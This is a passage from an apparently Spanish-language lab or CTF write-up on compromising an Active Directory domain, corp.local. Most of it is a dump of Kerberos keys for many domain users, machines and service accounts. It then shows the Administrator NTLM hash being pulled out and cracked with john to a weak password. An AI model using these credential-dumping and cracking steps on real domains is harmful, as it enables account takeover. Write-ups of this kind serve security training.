corp.local\ernaline.lowell:aes256-cts-hmac-sha1-96:ea8bf25ae3c220299320f801f5d9350c41db78426c065fb5c087a8ddc0595b2b
corp.local\ernaline.lowell:aes128-cts-hmac-sha1-96:e83f6e1dfd973a14219ebf28a7c9c594
corp.local\ernaline.lowell:des-cbc-md5:cb2a25f2fe945146
corp.local\gerri.kathi:aes256-cts-hmac-sha1-96:712fe78c9e4b85e79814b299475641853272fb5dc7359dd662a9e2bb68162f5a
corp.local\gerri.kathi:aes128-cts-hmac-sha1-96:22eb5fd56818843559e0dfaa33a94fcf
corp.local\gerri.kathi:des-cbc-md5:bad507f285ab5eef
corp.local\goldarina.nicki:aes256-cts-hmac-sha1-96:67f681c00e5f038095760423d8d45e53005b9da0cb641a4d3679e06e1b15c02d
corp.local\goldarina.nicki:aes128-cts-hmac-sha1-96:7c3db6e933a5e669df1ad6de76ce222e
corp.local\goldarina.nicki:des-cbc-md5:f47a8345e55e199b
corp.local\avril.cheri:aes256-cts-hmac-sha1-96:b9b16e42a70e95ce5d2693e189febc0a5ade92184a7eb9f7331688b7f2ac832e
corp.local\avril.cheri:aes128-cts-hmac-sha1-96:255d77be5986dfbbf6fca35e8cda06ca
corp.local\avril.cheri:des-cbc-md5:adc1d0298abca85e
corp.local\bobette.glenn:aes256-cts-hmac-sha1-96:12272cf604711ef43d94939af5c6dc94455df8bb50f012523f68805291a9711e
corp.local\bobette.glenn:aes128-cts-hmac-sha1-96:a35d94072b5b22255361096ed4954982
corp.local\bobette.glenn:des-cbc-md5:d070ab839dcd2cc7
corp.local\joanie.karine:aes256-cts-hmac-sha1-96:2d29b24c52db27c2592120cbd42b9bdca9f164b4561b2e818b997cda7ca69885
corp.local\joanie.karine:aes128-cts-hmac-sha1-96:af7e428c930497b41d66aa3db4acb9d2
corp.local\joanie.karine:des-cbc-md5:5b915b499dcef85b
corp.local\gwenneth.gilly:aes256-cts-hmac-sha1-96:5cc366d07706b060f3d1f257ac70fd369774380859c038eaa8d5bcff90738fb5
corp.local\gwenneth.gilly:aes128-cts-hmac-sha1-96:aa8584e6d3790a22b19e314e1e9ce398
corp.local\gwenneth.gilly:des-cbc-md5:51d0fed9bce9ae29
corp.local\saidee.kaye:aes256-cts-hmac-sha1-96:891a784d7cb992093695592b2c490ae5b4a7eff8cb51a4f811a40c1073cdcf52
corp.local\saidee.kaye:aes128-cts-hmac-sha1-96:6c6b1b4f6450acffdd12c8a124980134
corp.local\saidee.kaye:des-cbc-md5:e6346df134f4b3fb
corp.local\cynthie.rori:aes256-cts-hmac-sha1-96:d737d7d2e216accada8cf35ba416f7cbebe839d90f191fabc418d80bf6c8422f
corp.local\cynthie.rori:aes128-cts-hmac-sha1-96:0fea0a434a5b4cbc034fe2b631a35ea4
corp.local\cynthie.rori:des-cbc-md5:e0a2df9bfe6e7f25
corp.local\cristabel.melony:aes256-cts-hmac-sha1-96:fa6085559145b2ff32eb15ac1c9d3150bf86ee9d62c07ebbf6bd941a18edab5f
corp.local\cristabel.melony:aes128-cts-hmac-sha1-96:92f9d313eadebfa3293819929a5973dc
corp.local\cristabel.melony:des-cbc-md5:682368541ab0a29e
corp.local\mela.jacquetta:aes256-cts-hmac-sha1-96:f7dd2aab8dd167421e79ec272c1e81bcc8ce1a984dcc52993fc8b36595dae8e4
corp.local\mela.jacquetta:aes128-cts-hmac-sha1-96:427091a770df792908907494091c45fe
corp.local\mela.jacquetta:des-cbc-md5:cd730408d97c02c7
corp.local\jennifer.gerry:aes256-cts-hmac-sha1-96:ac680c06e5a3b323cc367ec128f922759c660787e975739ef616eff7c52198c7
corp.local\jennifer.gerry:aes128-cts-hmac-sha1-96:a3fd545f2692f96b213d25eb0a990ac2
corp.local\jennifer.gerry:des-cbc-md5:7f37c4325d2adfce
corp.local\ginevra.michel:aes256-cts-hmac-sha1-96:d76fe99dda5c2f6b8b5fe3025a6b6eac566798914c3327675bdbfa859756227b
corp.local\ginevra.michel:aes128-cts-hmac-sha1-96:fdfb9c672e73ada5c7b1f3ac02e7a270
corp.local\ginevra.michel:des-cbc-md5:d0a2f43da17919c4
corp.local\arabella.norry:aes256-cts-hmac-sha1-96:12269ce23b3860d8790170a13f9aab8cf4a72ee7cce44c7d5162c157be4fdedf
corp.local\arabella.norry:aes128-cts-hmac-sha1-96:6f09e8b457343ebd4aa71a40d3120d08
corp.local\arabella.norry:des-cbc-md5:d0734c54ea643bfb
corp.local\colly.katey:aes256-cts-hmac-sha1-96:8c2f7f01f3a8c30be4a7d38462758c3b032fad38d7e4c8fb14b30d85dfffc219
corp.local\colly.katey:aes128-cts-hmac-sha1-96:d283584223ad2bf2a3c0ff6c3a0ba395
corp.local\colly.katey:des-cbc-md5:f4bc68fd7af116b3
corp.local\marsha.jordan:aes256-cts-hmac-sha1-96:ef4ec373904bf53368bcdb3a4907228559e4f48882d10e36742558a0e5681a30
corp.local\marsha.jordan:aes128-cts-hmac-sha1-96:b784fb2fcc06f92341b9c4de65070424
corp.local\marsha.jordan:des-cbc-md5:94611319c4c432bc
corp.local\britni.henrieta:aes256-cts-hmac-sha1-96:e720871d7bf9275949c045c94a28f47314ce82e40fe621b1247b0012fa594955
corp.local\britni.henrieta:aes128-cts-hmac-sha1-96:ddc8b33f7aaf6f7b6318e2cc31d18ab3
corp.local\britni.henrieta:des-cbc-md5:614cda347a10c886
corp.local\alejandrina.faye:aes256-cts-hmac-sha1-96:49f500a83e0c0775787767834512d736cf094bb46bb313b1cecd4f7185ac3765
corp.local\alejandrina.faye:aes128-cts-hmac-sha1-96:f76eb360995992d0ec3d88c59f009be0
corp.local\alejandrina.faye:des-cbc-md5:e99d266d7f85a7ae
corp.local\philis.bertha:aes256-cts-hmac-sha1-96:b80917389da3f2ba966618a114f49b3ea2b62b19d1269a35a2c3f2710c108c42
corp.local\philis.bertha:aes128-cts-hmac-sha1-96:fac4d013887f4c330dca47d81b353711
corp.local\philis.bertha:des-cbc-md5:cecdf24f7c25c707
corp.local\harriett.daron:aes256-cts-hmac-sha1-96:d2e86f929669ee781db8749482cfdec91a0f349ee0f5c9fe88afa2ec0f9c97c0
corp.local\harriett.daron:aes128-cts-hmac-sha1-96:8d64b2799db2df3017e7909ddd2c7091
corp.local\harriett.daron:des-cbc-md5:ea1fb6ceef2534b6
corp.local\ardine.farra:aes256-cts-hmac-sha1-96:e1885f3de176a4d653f4db9aa6001a01bdbd46073f3265a06e38950b516ced8a
corp.local\ardine.farra:aes128-cts-hmac-sha1-96:d3007e5b3b029f1d068706aa0a377ada
corp.local\ardine.farra:des-cbc-md5:c1ea58975da28cea
corp.local\robena.prudence:aes256-cts-hmac-sha1-96:1660e99b70f65892f6564fe29bbf5402a9d5ecfa3b468d3ff3ae3a969f34b92e
corp.local\robena.prudence:aes128-cts-hmac-sha1-96:9129419efe0e95abdcbf0866effeef69
corp.local\robena.prudence:des-cbc-md5:13019b9ea21f0b1a
corp.local\pearl.judye:aes256-cts-hmac-sha1-96:a540966cf2e092790092f8369b4ea40cb8b7d5d32096e51f50f8e4c2d82d9863
corp.local\pearl.judye:aes128-cts-hmac-sha1-96:5d9247c8f3f5295ca97a861df067fe9f
corp.local\pearl.judye:des-cbc-md5:6716feb337454976
corp.local\riva.nellie:aes256-cts-hmac-sha1-96:5dc757528f38cd3869b21c5cc5ac0ab64da40d0605dc5dbc7f121aefc1223ef5
corp.local\riva.nellie:aes128-cts-hmac-sha1-96:170fb32ddc4fdd2a5863a238315733ad
corp.local\riva.nellie:des-cbc-md5:e9e96dc4bc92d934
corp.local\jobina.aleta:aes256-cts-hmac-sha1-96:91edea203b1317745ae411b6fafbdf6969402fb55668d8de2a6e154da0d588f6
corp.local\jobina.aleta:aes128-cts-hmac-sha1-96:23c24012f87ddcf798285a132ecec116
corp.local\jobina.aleta:des-cbc-md5:6e976202b3d68a91
corp.local\fayina.hyacinth:aes256-cts-hmac-sha1-96:383006456ea5bb875d7fbc6e9e37287eaac8ec87da569ade7598ac988081b5da
corp.local\fayina.hyacinth:aes128-cts-hmac-sha1-96:71c13133392b49c8ad9b557b97c9c9d3
corp.local\fayina.hyacinth:des-cbc-md5:cbc113798cd0efa2
corp.local\loretta.jerrine:aes256-cts-hmac-sha1-96:ed5f2e97ca0e8158d8322c6c77143bf5bd0a1b47df03ae5647841e522af6edbd
corp.local\loretta.jerrine:aes128-cts-hmac-sha1-96:ba97aaf42ad0615e4b53f5aceda656ce
corp.local\loretta.jerrine:des-cbc-md5:d03d3ee675aebc8a
corp.local\peta.adelind:aes256-cts-hmac-sha1-96:79baa9c5b89a7600b14bde34d22691334f3f820a8b4c38e859c87a9cd96cfe58
corp.local\peta.adelind:aes128-cts-hmac-sha1-96:8a99a9fc35e7ea361664fe62535d84b9
corp.local\peta.adelind:des-cbc-md5:b9eae513bfbcadb6
corp.local\ophelie.odele:aes256-cts-hmac-sha1-96:2dd48c1cc85734638c0df604923afbb121cd0929f2ebd3bc73c7e0413bb2a8bc
corp.local\ophelie.odele:aes128-cts-hmac-sha1-96:943f350b81d7c67dd3b22f799654a3e6
corp.local\ophelie.odele:des-cbc-md5:524902ef3468bcd9
corp.local\cybil.alica:aes256-cts-hmac-sha1-96:6da1ede53e28877f772b42a878c29ec6f2a3421f9449a1a701160edb19e53ac4
corp.local\cybil.alica:aes128-cts-hmac-sha1-96:2fe4fff5388bdc3b6ca76c7ed0b674a8
corp.local\cybil.alica:des-cbc-md5:79917326c8f708b9
corp.local\shay.siana:aes256-cts-hmac-sha1-96:2ce4f484df3794caed604a8b76809b923dc374e34be1f3b4fa1bf90fb3cc1dea
corp.local\shay.siana:aes128-cts-hmac-sha1-96:71d3caf2f21f23e519f25c4d050e4703
corp.local\shay.siana:des-cbc-md5:4a98a1133d2af4e5
corp.local\halette.martelle:aes256-cts-hmac-sha1-96:73b69cbf3f78296c9c1b2c119796474f1851554a86df54a711bce55088569b33
corp.local\halette.martelle:aes128-cts-hmac-sha1-96:f6e152c6072837025ceeecb317a97e9d
corp.local\halette.martelle:des-cbc-md5:9ba47f0ef7bfeaec
corp.local\audrey.hedwiga:aes256-cts-hmac-sha1-96:65ddebc40d3d5196ed3f0210a30c7c48286007e4645f257c6c97a582dd3d98cc
corp.local\audrey.hedwiga:aes128-cts-hmac-sha1-96:c4bcd2edfe62958f9712eebcbae25dfc
corp.local\audrey.hedwiga:des-cbc-md5:45a78c29d90ec438
corp.local\betsey.stephine:aes256-cts-hmac-sha1-96:b0e056be5e7a2ee7de4b4f6ed9a2fa76dafc4d6ed2b0904da711d24674412eef
corp.local\betsey.stephine:aes128-cts-hmac-sha1-96:85a91ebf741026c3cc0aa83a39540059
corp.local\betsey.stephine:des-cbc-md5:b32a37168feaec75
corp.local\demetris.daveta:aes256-cts-hmac-sha1-96:e31dec4633cdec15e62aaebf1fa89ab4171a3684ff8d1bcff19c13fd731e3616
corp.local\demetris.daveta:aes128-cts-hmac-sha1-96:e1d9275208dc0a162fde3f23fc61b534
corp.local\demetris.daveta:des-cbc-md5:76b6868952a116ba
corp.local\lexy.rosaline:aes256-cts-hmac-sha1-96:79d32b03be1f12a5a4f5cbbc00f50c1434f32ba6c8303fe25de3f005537e1ca2
corp.local\lexy.rosaline:aes128-cts-hmac-sha1-96:5aad1cb9f844c8e79f1eed65a936b5da
corp.local\lexy.rosaline:des-cbc-md5:1654f8b620a8f1ec
corp.local\ilyssa.nevsa:aes256-cts-hmac-sha1-96:e54bece1d8e88fc346662122bbf9c73d259ec989065cf63dc99de8ff484710ef
corp.local\ilyssa.nevsa:aes128-cts-hmac-sha1-96:62f35e028f7944d12ae4f8fa9b1d215c
corp.local\ilyssa.nevsa:des-cbc-md5:984c01237c89ae52
corp.local\denice.freda:aes256-cts-hmac-sha1-96:837dd3ac11d1e4475bdd64aa9b8d07b04ebc00f2bc43d55cd324524b5489aca4
corp.local\denice.freda:aes128-cts-hmac-sha1-96:97d67d8663631d6ee01f550c10491bb7
corp.local\denice.freda:des-cbc-md5:57efc243e0b9cb01
corp.local\georgia.marie-ann:aes256-cts-hmac-sha1-96:5196e0fd702bb0929db1b57f2fce7b48cf846c225dc8f4e14bdfbfe56e0cc2b7
corp.local\georgia.marie-ann:aes128-cts-hmac-sha1-96:694c9d889e2e19736567cd2187c6cd87
corp.local\georgia.marie-ann:des-cbc-md5:b067bf98d386ba6d
corp.local\benny.alikee:aes256-cts-hmac-sha1-96:e9bd56bce394a715f0f528c9a014a03bb0a169eb7f4068676897eaf527845552
corp.local\benny.alikee:aes128-cts-hmac-sha1-96:880e5ec5a84d6a92d6144ecd4dfb5f8e
corp.local\benny.alikee:des-cbc-md5:e5a8648fa2b6ab3d
corp.local\sandye.leodora:aes256-cts-hmac-sha1-96:4f432e532f1b16fdc65e2902c89da44fd6611bc2b15a5d6922de99dcd7a71c1f
corp.local\sandye.leodora:aes128-cts-hmac-sha1-96:586f9a902713509d11e46a233515732e
corp.local\sandye.leodora:des-cbc-md5:68021ca2ecce151c
corp.local\germain.gavrielle:aes256-cts-hmac-sha1-96:5917ec84fbc9885ad797619ef98a28b8678ed76f7e85d98ac601b853f35daab0
corp.local\germain.gavrielle:aes128-cts-hmac-sha1-96:e26e132072d04121d28faab7bef037c9
corp.local\germain.gavrielle:des-cbc-md5:32130e86851cdc1a
corp.local\milicent.gracie:aes256-cts-hmac-sha1-96:6c6f782625639453f87d8950c8a0e66d9c515d57afd557e8a54c40d5b6486a2a
corp.local\milicent.gracie:aes128-cts-hmac-sha1-96:e7874375a1dac4023c6a6538a21dd725
corp.local\milicent.gracie:des-cbc-md5:13bca4265480dc98
corp.local\meg.carolee:aes256-cts-hmac-sha1-96:d237b7c1ad3fbaceda6d8e306f9a2a061ecf3e690de7c89ea7069d414cac5122
corp.local\meg.carolee:aes128-cts-hmac-sha1-96:fe0f49011aff70aba0ade2abe1823458
corp.local\meg.carolee:des-cbc-md5:cd62510b196ba2e0
corp.local\linn.evaleen:aes256-cts-hmac-sha1-96:34c1044c4d74db133877b241894568ca7a146ed7a2ee48a1f9db16f114de4165
corp.local\linn.evaleen:aes128-cts-hmac-sha1-96:94fdaefccc19b23bc48e545389ee451d
corp.local\linn.evaleen:des-cbc-md5:9eb96e255d234c75
corp.local\mirna.annice:aes256-cts-hmac-sha1-96:dea2604204199185474d30447263764009c09009a639abe349be1fbfbd8f08fd
corp.local\mirna.annice:aes128-cts-hmac-sha1-96:d6c4b5492b40b97c724e63475c901cc8
corp.local\mirna.annice:des-cbc-md5:ce546bc71a7a4694
corp.local\diana.sharai:aes256-cts-hmac-sha1-96:bc7f420ec66917abcb2271ecae2cc9c19c5d3b165883383b510d8dc50ad03a2a
corp.local\diana.sharai:aes128-cts-hmac-sha1-96:b2c1c13abed56c94653067cac152f819
corp.local\diana.sharai:des-cbc-md5:fb409b9bf7496d46
corp.local\deeann.amalita:aes256-cts-hmac-sha1-96:27bd2c3d2ff21d6793ff6b322773cb0e957b597c4babed826b54cd9f11bd0ab8
corp.local\deeann.amalita:aes128-cts-hmac-sha1-96:342fcdf8aa46f2b780de740b819498bd
corp.local\deeann.amalita:des-cbc-md5:b604da027c253d7f
corp.local\kettie.shanta:aes256-cts-hmac-sha1-96:51a764831befa5a6d16040c8c97a78156c129a31e31c328289d684fefd258762
corp.local\kettie.shanta:aes128-cts-hmac-sha1-96:3b63fa906556e001a5903b50a9499569
corp.local\kettie.shanta:des-cbc-md5:85526210da8a9210
corp.local\estelle.kelli:aes256-cts-hmac-sha1-96:b1de3681195f9176294c849b5796ff6409cb5fb8835b767399fb97903d4d8dfd
corp.local\estelle.kelli:aes128-cts-hmac-sha1-96:566c50569d489d0268ec58efcfdb391b
corp.local\estelle.kelli:des-cbc-md5:643b6e9d942af746
corp.local\guenna.jessi:aes256-cts-hmac-sha1-96:03da73f561d59701d6aae94f6bb9c8da2aa4c6383d9ba4c2aaef579ba4d44d24
corp.local\guenna.jessi:aes128-cts-hmac-sha1-96:1a64efe2ba2bd75c82caff8e3ae2915a
corp.local\guenna.jessi:des-cbc-md5:d5c8975e2cfd68e3
corp.local\allissa.lezlie:aes256-cts-hmac-sha1-96:b514e4642641a57ae600d5e108773724b6be41d1f18748ff92dc373e352bcfac
corp.local\allissa.lezlie:aes128-cts-hmac-sha1-96:66e666b4390d775ee512a8ba725690bd
corp.local\allissa.lezlie:des-cbc-md5:92c2a1cbef5176df
corp.local\crissie.deena:aes256-cts-hmac-sha1-96:4cef8251d9fb6b026ce8c67c9bd31c95a3e806b7ba6a40fad644e9c464e359c3
corp.local\crissie.deena:aes128-cts-hmac-sha1-96:0e65551474666cb8cff64b5508c06db7
corp.local\crissie.deena:des-cbc-md5:3d312f019d8f891a
corp.local\olga.rhoda:aes256-cts-hmac-sha1-96:abf749a13e5ab626f402d2f58a32cf88b9f85e738a7853b209774558b97dcad2
corp.local\olga.rhoda:aes128-cts-hmac-sha1-96:36788f6e2e5c1e3a25679692e72b8720
corp.local\olga.rhoda:des-cbc-md5:02f40b46f20e3480
corp.local\anna.costanza:aes256-cts-hmac-sha1-96:1537a9bb733535535a0392ad546a7833acb76b658ec825e8fb1ccab2513a6e10
corp.local\anna.costanza:aes128-cts-hmac-sha1-96:ecac006ee4fcd4beedf9bc78220efbd6
corp.local\anna.costanza:des-cbc-md5:5d04f2e32fd9da68
corp.local\corie.josie:aes256-cts-hmac-sha1-96:11084caf781f75b25a45cfb31278b0926800fff56422acd6b3572f63b8ea27a7
corp.local\corie.josie:aes128-cts-hmac-sha1-96:7cc7962f3800b7a03da3a31ebb52ddd3
corp.local\corie.josie:des-cbc-md5:d9adbfe63237cb15
corp.local\evy.britta:aes256-cts-hmac-sha1-96:db6397ee335423b51142882a1c39eecd188f4fe77d1a27dd666e55d18c665287
corp.local\evy.britta:aes128-cts-hmac-sha1-96:2e7eb3e5434fe2f43880b459972c878b
corp.local\evy.britta:des-cbc-md5:b668ced3e0abc438
corp.local\jaime.luise:aes256-cts-hmac-sha1-96:84ea2587a1629862a67e15f9db1f917977eb23f01eb9e5a20553d8b7c278be13
corp.local\jaime.luise:aes128-cts-hmac-sha1-96:f8b4648676fcb37a25036ed618afc812
corp.local\jaime.luise:des-cbc-md5:83973425bcbcd368
corp.local\gennifer.cleo:aes256-cts-hmac-sha1-96:72a56c4242d0ca9408eba589351fe85c5960c9558b657d6345727a3d4c7aeceb
corp.local\gennifer.cleo:aes128-cts-hmac-sha1-96:42f51a124b86ebbf37b05109eb400507
corp.local\gennifer.cleo:des-cbc-md5:5737a767a4fb1561
corp.local\colly.elfie:aes256-cts-hmac-sha1-96:2c13848586a6a10f900fcd87ac01a7379e849539624857d8128cb3770e90d3eb
corp.local\colly.elfie:aes128-cts-hmac-sha1-96:f0ac370b2e5854a8237466da1b079aa6
corp.local\colly.elfie:des-cbc-md5:1f1f8a02860491b5
corp.local\gill.kellie:aes256-cts-hmac-sha1-96:988f5967daae7f3649512a5b44ba3802d7c7da93cd0c2ea15e67b0190001c811
corp.local\gill.kellie:aes128-cts-hmac-sha1-96:9db20e20be5405f580d1ffdc5a8e74ad
corp.local\gill.kellie:des-cbc-md5:04325283d0b908a7
corp.local\carmon.leoine:aes256-cts-hmac-sha1-96:26f28eb30f6a213a56e3ecd25c49be28c3d1ec8476807d09a95d53c7dd2a81e5
corp.local\carmon.leoine:aes128-cts-hmac-sha1-96:f2935b237a7982856b75afca090d466c
corp.local\carmon.leoine:des-cbc-md5:542923a486ab8c52
corp.local\farrand.inna:aes256-cts-hmac-sha1-96:9ebce6c239a67d190d5874423c8027aa09c587ec5687e111cf50715d856dfe92
corp.local\farrand.inna:aes128-cts-hmac-sha1-96:2147154a19bab6738ba6fd629ae249ac
corp.local\farrand.inna:des-cbc-md5:bce65b1540eca7a8
corp.local\donnie.lari:aes256-cts-hmac-sha1-96:96613a1da06ca554f2b9284356cef6e4c616a0ab013995c0a7652638472d6217
corp.local\donnie.lari:aes128-cts-hmac-sha1-96:530f0daed1f394e4e7b431cedc722d43
corp.local\donnie.lari:des-cbc-md5:5451588910cd8c4c
corp.local\millie.hanny:aes256-cts-hmac-sha1-96:da694f15bdaf258cb373a8d825d94bf98bda9053e6900a01ad58fdae834e384f
corp.local\millie.hanny:aes128-cts-hmac-sha1-96:33467d110407f4ab1d6f15e17a6f1ff4
corp.local\millie.hanny:des-cbc-md5:8f7ac4f7679d838a
corp.local\sarita.alisha:aes256-cts-hmac-sha1-96:2c5a7e02f4d737522066350151b2ff561c452a8e24a02dbb95b6f725df5ee17a
corp.local\sarita.alisha:aes128-cts-hmac-sha1-96:de391532d0e4aa6a761937b25194889f
corp.local\sarita.alisha:des-cbc-md5:37988cb6f1d60dce
corp.local\rycca.jacinta:aes256-cts-hmac-sha1-96:afee8c4810e0eb2d7bf6bb382329bf59e6609654ae4812b72fc77fe0dd197c6f
corp.local\rycca.jacinta:aes128-cts-hmac-sha1-96:ca0359bff7c1ada126232c29b6fd3929
corp.local\rycca.jacinta:des-cbc-md5:3207e39ba1ab893e
corp.local\levin.bab:aes256-cts-hmac-sha1-96:1310fda804edd9264086e63f2b789a51e364ea5148bbc1379792eabc0351320d
corp.local\levin.bab:aes128-cts-hmac-sha1-96:fda22e6a0e283f863f1cae13391d2ae6
corp.local\levin.bab:des-cbc-md5:bad019b90d8694c1
corp.local\celle.sherye:aes256-cts-hmac-sha1-96:007bfbe0f1f95440d87e3f46350a0839e7cb0be06e11c24f707b3f6bca8d292b
corp.local\celle.sherye:aes128-cts-hmac-sha1-96:823cc586221ce21181794b235e671b2c
corp.local\celle.sherye:des-cbc-md5:62d5c1c87f7a1ada
corp.local\chloris.ilysa:aes256-cts-hmac-sha1-96:4e03a058b8ec03a65369c0cffe0e82354dbe9d18cf056393a1409247a5fc9337
corp.local\chloris.ilysa:aes128-cts-hmac-sha1-96:cd6515c705a47ef32bf017feed703414
corp.local\chloris.ilysa:des-cbc-md5:a2d50b58c28a1531
corp.local\kelley.happy:aes256-cts-hmac-sha1-96:1b76faec14b5d6bdd43ab64a9deddca86de0f4605f0fb8a1a2ab758f291d0a5d
corp.local\kelley.happy:aes128-cts-hmac-sha1-96:a4c83af7535964ee35b657bb89ec3a21
corp.local\kelley.happy:des-cbc-md5:2ab5e59d6d543e54
corp.local\darsey.jasmine:aes256-cts-hmac-sha1-96:a92ee01bfc0317f526d61d9549cc97d0e92957331851a24f9ee11db8d1bb7642
corp.local\darsey.jasmine:aes128-cts-hmac-sha1-96:d8dac96c3b11dc4732695c035b30b01c
corp.local\darsey.jasmine:des-cbc-md5:7919cb859451f75b
corp.local\ebba.nicoline:aes256-cts-hmac-sha1-96:753982495076fcdda313b6f2420877579f1d1ec197320f01b79c42ccfbf087a9
corp.local\ebba.nicoline:aes128-cts-hmac-sha1-96:90c577e0405f260fe22398a0508bd890
corp.local\ebba.nicoline:des-cbc-md5:c44a79bae3bf0457
corp.local\geneva.lorrin:aes256-cts-hmac-sha1-96:64527f0cbd4d3ee94e99d9ccf4c21e52e3b8af490dd44df21b52cf3e19537406
corp.local\geneva.lorrin:aes128-cts-hmac-sha1-96:796b4d3c3f58f1b232d60a3ac2271a49
corp.local\geneva.lorrin:des-cbc-md5:9d510eb6b5ce3401
corp.local\joellyn.pippa:aes256-cts-hmac-sha1-96:c04ccb6f5e729114ce13e2d40db28222cd1272ba00d6132059632a558ef45848
corp.local\joellyn.pippa:aes128-cts-hmac-sha1-96:99bc3a4650a23d3b28ba5d808be2eb7c
corp.local\joellyn.pippa:des-cbc-md5:02107aa223759494
corp.local\renelle.jacynth:aes256-cts-hmac-sha1-96:120b67e841457ead16156c557fa2309f65e1bf9106b4942ed665d4ea0d130453
corp.local\renelle.jacynth:aes128-cts-hmac-sha1-96:1ec22dcaf28cf9e1304e027d6696d6e1
corp.local\renelle.jacynth:des-cbc-md5:6e7c467a49f88307
corp.local\sarah.rhoda:aes256-cts-hmac-sha1-96:afe063ef2ab6895e0fd9ae1e95c9e30aadff23571f4e8a8927585920e88fe8b3
corp.local\sarah.rhoda:aes128-cts-hmac-sha1-96:db2248dfed22e2659b59b707f2cdf845
corp.local\sarah.rhoda:des-cbc-md5:98fde3fb5b078f61
corp.local\annice.mable:aes256-cts-hmac-sha1-96:35a4152d3189fdce3d0261069a377d7e5c76da0e66b72ef7e617e33d5a7ed50b
corp.local\annice.mable:aes128-cts-hmac-sha1-96:fb41a73e5bce7db24c93568d0ab94914
corp.local\annice.mable:des-cbc-md5:4a5ed5f2318fcd04
corp.local\aimil.evangelia:aes256-cts-hmac-sha1-96:310e75e280d4aec846007a66583962ba3cd4f1041358932c1f56b432566ae72e
corp.local\aimil.evangelia:aes128-cts-hmac-sha1-96:2bee9530f854ff01d4c1cf9fd9903d4c
corp.local\aimil.evangelia:des-cbc-md5:94b629e9adc757f8
DC01$:aes256-cts-hmac-sha1-96:42e6d83a65fa4fc7246f8ee733d26121a49a9b7fb79f8c820486766930eb6b55
DC01$:aes128-cts-hmac-sha1-96:dc0559121ad2f325f3adfd4ef3a40810
DC01$:des-cbc-md5:e089df5d8557230d
WS01$:aes256-cts-hmac-sha1-96:9a9fc7447f8fa5521eeef5af175be7af2189392bc0d56f2e7d41e4c15cdad294
WS01$:aes128-cts-hmac-sha1-96:73670fc7a88720c24ff4c869dc84a9c1
WS01$:des-cbc-md5:8c5bea107cc8c804
WS02$:aes256-cts-hmac-sha1-96:e9b07b4fd4eb450ff0ce44d98d11d9485719806e6d7d60bef4f652aaedb2717a
WS02$:aes128-cts-hmac-sha1-96:3871f4df0e13a13df8de79a53364d007
WS02$:des-cbc-md5:8916d9a11ccd165e
exchange_svc$:aes256-cts-hmac-sha1-96:a584fb328eb1edf44a49b6b1e505d52e0adc4ffd095eee243fbac77e63e76002
exchange_svc$:aes128-cts-hmac-sha1-96:7fd268563b243acb06be75cdea82632b
exchange_svc$:des-cbc-md5:b06bd3619d64ec7c
mssql_svc$:aes256-cts-hmac-sha1-96:a1108d374e6912e1366d41c38e8d017a60b20ffd50b95fdd7cfdbe09005dcbaf
mssql_svc$:aes128-cts-hmac-sha1-96:0e9c3faf39112b10356cb1d3b7a01926
mssql_svc$:des-cbc-md5:7926da43c45425cd
http_svc$:aes256-cts-hmac-sha1-96:4d4ad82f4260b42bfd0dded741a3e2d8e7383ce92db2c9ed44a3a34bf2d7c3f4
http_svc$:aes128-cts-hmac-sha1-96:9ef1ea7c9d29943b75032884d8914b06
http_svc$:des-cbc-md5:3dd5b05dcb7326b3
[*] Cleaning up...
```

Y con esto nos habria volcado todos los `hashes`de todos los usuarios del dominio, en concreto el que nos interesa el del `Administrador`:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::
```

Teniendo un `hash NTLM` en este caso el de `Administrador` podremos porbar a crackearlo en nuestro `kali` de la siguiente forma:

```shell
echo Administrator:500:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86::: > admin.hash
john --format=NT admin.hash
```

Info:

```
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 6 candidates buffered for the current salt, minimum 12 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Passw0rd         (Administrator)     
1g 0:00:00:00 DONE 2/3 (2025-01-12 12:18) 100.0g/s 669000p/s 669000c/s 669000C/s Blahblah..Ihateyou
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```

Y vemos que nos crackeo la contraseña correctamente, por lo que tenia una contraseña debil.
